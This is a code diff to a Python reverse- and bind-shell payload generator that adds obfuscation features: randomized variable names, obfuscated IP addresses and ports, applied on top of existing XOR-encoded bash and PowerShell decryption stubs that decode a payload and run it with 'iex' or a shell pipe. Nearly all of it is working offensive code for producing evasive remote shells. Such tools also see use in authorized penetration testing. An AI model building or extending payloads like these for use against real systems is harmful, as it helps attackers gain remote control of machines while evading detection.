@@ -1,3 +1,4 @@
+from obfuscators import randomize_vars, ipfuscate, obfuscate_port
 from encoders import powershell_base64, xor, to_unicode, to_urlencode
 from binascii import hexlify
 from binary import shellcode_to_hex, shellcode_to_ps1, WINDOWS_BLOODSEEKER_SCRIPT # imported since 0.3.6
@@ -87,8 +88,9 @@ def xor_wrapper(name, code, args, shell="/bin/bash"):
         shell = args.shell
     if "powershell" not in name.lower():
         if "windows" not in name.lower():
-            code = """s="";for x in $(echo {0}|sed "s/../&\\n/g"); do s=$s$(echo -e $(awk "BEGIN {{printf \\"%x\\n\\", xor(0x$x, {1})}}"|sed "s/../\\\\\\\\x&/g"));done;echo $s|{2}""".format(hexlify(xor(code, args.xor)), hex(args.xor), shell)
+            code = """VAR1="";for VAR2 in $(echo {0}|sed "s/../&\\n/g"); do VAR1=$VAR1$(echo -e $(awk "BEGIN {{printf \\"%x\\n\\", xor(0x$VAR2, {1})}}"|sed "s/../\\\\\\\\x&/g"));done;echo $VAR1|{2}""".format(hexlify(xor(code, args.xor)), hex(args.xor), shell)
             code = shell + " -c '" + code + "'"
+            code = randomize_vars(code, args.obfuscate_small)
     else:
         # Improved code in 0.3.6
         if "-Command" in code:
@@ -102,8 +104,9 @@ def xor_wrapper(name, code, args, shell="/bin/bash"):
         code = to_unicode(pcode)  # String to Unicode
         code = xor(code, args.xor)  # XOR encode using random key <--
         code = powershell_base64(code, unicode_encoding=False) # We need it in base64 because it is binary
-        code = """ $k={0};$b='{1}';$d=[Convert]::FromBase64String($b);$dd=foreach($byte in $d) {{$byte -bxor $k}};$dm=[System.Text.Encoding]::Unicode.GetString($dd);iex $dm""".format(args.xor, code) # Decryption stub
+        code = """ $VAR1={0};$VAR2='{1}';$VAR3=[Convert]::FromBase64String($VAR2);$VAR4=foreach($VAR5 in $VAR3) {{$VAR5 -bxor $VAR1}};$VAR7=[System.Text.Encoding]::Unicode.GetString($VAR4);iex $VAR7""".format(args.xor, code) # Decryption stub
         code = prefix + "-Command " + '"%s"' % code
+        code = randomize_vars(code, args.obfuscate_small)
     return code
 
 
@@ -133,7 +136,7 @@ def base64_wrapper(name, code, args, shell="/bin/bash"):
 
 
 class Shell(object):
-    def __init__(self, name, short_name, shell_type, proto, code, system=None, arch=None, use_handler=None, use_http_stager=None):
+    def __init__(self, name, short_name, shell_type, proto, code, system=None, lang=None, arch=None, use_handler=None, use_http_stager=None):
         """
         ShellCode object is responsible for holding information about
         the static characteristics and informations about this shell 
@@ -152,7 +155,8 @@ class Shell(object):
 
         # These are optional attributes;
         self.system_os = "unknown" if system is None else system
-        self.arch = "Unknown" if arch is None else arch
+        self.lang = "unknown" if lang is None else lang
+        self.arch = "unknown" if arch is None else arch
         self.handler = None if use_handler is None else use_handler # this is going to be the handler function.
         self.handler_args = None # this is going to be set during execution.
 
@@ -164,8 +168,9 @@ class Shell(object):
     
     
 class ReverseShell(object):
-    def __init__(self, name, args, code):
+    def __init__(self, name, lang, args, code):
         self.name = name
+        self.lang = lang
         self.args = args
         self.host = args.host
         self.port = args.port
@@ -177,6 +182,10 @@ class ReverseShell(object):
         Generate the code.
         Apply encoding, in the correct order, of course.
         """
+        # Obfuscate IP and port if set in args
+        if self.args.ipfuscate and self.lang != "powershell":  # Windows shells doesn't support ipfuscation
+            self.host = ipfuscate(self.host, self.args.obfuscate_small)
+            self.port = obfuscate_port(self.port, self.args.obfuscate_small, self.lang)
 
         # Update of 0.3.6
         # Some custom shells will not need TARGET and PORT strings.
@@ -184,8 +193,12 @@ class ReverseShell(object):
         if "TARGET" in self.code and "PORT" in self.code:
             self.code = str(self.code.replace("TARGET", self.host)).replace("PORT", str(self.port))
             
+            # Apply variable randomization
+            self.code = randomize_vars(self.code, self.args.obfuscate_small, self.lang)
+
             # Apply powershell-tuning if set in args.
             self.code = powershell_wrapper(self.name, self.code, self.args)
+
         else:
             # Custom shell. Here we need to program individually based in specifics.
             # TODO: I need to separate this into a custom file.
@@ -228,8 +241,9 @@ class ReverseShell(object):
 
 
 class BindShell(object):
-    def __init__(self, name, args, code):
+    def __init__(self, name, lang, args, code):
         self.name = name
+        self.lang = lang
         self.args = args
         self.port = args.port
         self.code = code
@@ -240,8 +254,15 @@ class BindShell(object):
         Generate the code.
         Apply encoding, in the correct order, of course.
         """
+        # Obfuscate IP and port if set in args
+        if self.args.ipfuscate:
+            self.port = obfuscate_port(self.port, self.args.obfuscate_small, self.lang)
+
         # Set connection data to the code.
         self.code = self.code.replace("PORT", str(self.port))
+
+        # Apply variable randomization
+        self.code = randomize_vars(self.code, self.args.obfuscate_small, self.lang)
 
         # Apply powershell-tuning if set in args.
         self.code = powershell_wrapper(self.name, self.code, self.args)
